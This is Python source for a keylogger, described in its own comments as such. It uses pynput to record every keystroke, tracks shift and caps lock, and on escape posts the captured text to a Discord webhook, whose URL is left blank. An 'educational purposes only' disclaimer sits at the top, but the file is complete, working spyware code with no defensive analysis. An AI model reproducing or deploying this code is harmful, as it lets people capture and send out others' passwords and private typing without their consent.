## The following program is a simple keylogger that records the keystrokes of a user and sends them to a Discord Webhook for viewing
## DISCLAIMER: TO BE USED RESPONSIBLY AND FOR EDUCATIONAL PURPOSES ONLY, THE DEVELOPER IS NOT LIABLE FOR ANY MISUSE OF THE PROGRAM

## Imports the necessary libraries for the program
from pynput import keyboard
import requests

## Creates necessary variables including the webhook that stores the API for the user's Discord Webhook and a blank text field to store the user's keystrokes for outputting
webhook = ""
text = ""
## Creates two toggle variables for the caps lock and shift button that inform the keylogger whether or not they are toggled during the user's session
caps = False
shift = False

## Stores the keyboard.Key function and keyboard.Listener subdirectories in variables for easy reference in the program
type = keyboard.Key
logger = keyboard.Listener

## Stores special characters to help optimize the program with each character performing a speciality function in the final outputted string (i.e. Pressing space causes a space in the text)
special = {
    type.space: " ",
    type.enter: "\n",
    type.tab: "\t",
}

## Creates the send function that will send the WebHook message to the Discord server of the user's choice with the recorded keystrokes
def send():
    ## Customizes the message sent by the Discord webhook in the user's Discord server
    data = {
        "embeds": [
        {
            "title": "Your KeyStrokes Have Been Logged!",
            "color": 2801612,
            "fields": [
        {
          "name": "You've been subject to a malicious keylogger, please view the recorded text below:",
          "value": text
        },
        {
          "name": "Next Steps",
          "value": "This was just a test, please be careful"
        }
        ],
        "image": {
            "url": "https://img.asmedia.epimg.net/resizer/v2/IIBECBP77FHVVIVA44UJMXWCNA.jpg?auth=a80efcfd83807d76749f71f77208cc32e504b8c6368886a043138efadd9f01f0&width=1200&height=1200&smart=true"
        }
        }
        ],
        'username': "Revival - Key Logger"
    }
    ## Posts the request to the webhook
    requests.post(webhook, json=data)

## Dictates what is recorded when a key is pressed
def on_press(key):
    global text, caps, shift
    ## If one of the keys pressed are one of the aforementioned special keys, the program appends it's aforementioned functionality to the text
    if key in special:
        text += special[key]
    ## If the backspace key is pressed, the program deletes the last pressed character
    elif key == type.backspace:
        text = text[:-1]
    ## If the shift key is pressed, the shift toggle is triggered
    elif key in (type.shift, type.shift_r):
        shift = True
    ## If the caps lock key is pressed, the caps toggle is switched from it's original position
    elif key == type.caps_lock:
        caps = not caps
    ## If the ctrl key is pressed, the program skips over the character
    elif key == type.ctrl_l or key == type.ctrl_r:
        pass
    ## If the escape key is pressed, the program exits and final webhook message is sent
    elif key == type.esc:
        return False
    ## If any other key is toggled (Such as an alphanumeric key), the program prints the key unless either caps lock or shift is toggled, in which case the uppercase of the key is printed
    elif hasattr(key, "char"):
        char = key.char
        if caps ^ shift:
            char = char.upper()
        text += char

## While the shift key is toggled, the program will continue to print uppercase letters until the shift key is let go, at which point the program will return to lowercase
def on_release(key):
    global shift
    if key in (type.shift, type.shift_r):
        shift = False

## Main method that listens for key presses and releases, once the exit key is triggered, the program joins all recorded keystrokes together before triggering the send method
with logger(on_press=on_press, on_release=on_release) as listen:
    listen.join()
    send()